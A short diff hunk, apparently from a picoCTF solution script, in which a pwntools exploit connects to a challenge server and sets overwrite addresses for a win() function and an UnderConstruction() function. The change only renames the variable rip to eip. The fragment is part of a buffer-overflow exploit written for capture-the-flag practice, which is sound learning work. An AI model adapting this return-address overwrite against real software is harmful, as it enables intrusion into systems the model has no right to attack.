@@ -479,7 +479,7 @@ from pwn import *
 
 sh = remote('saturn.picoctf.net', 56141)
 
-rip = p32(0x08049da0) # win()
+eip = p32(0x08049da0) # win()
 esp = p32(0x08049e20) # UnderConstruction()
 
 print(sh.recvuntil(b"Give me a string that gets you the flag").decode())
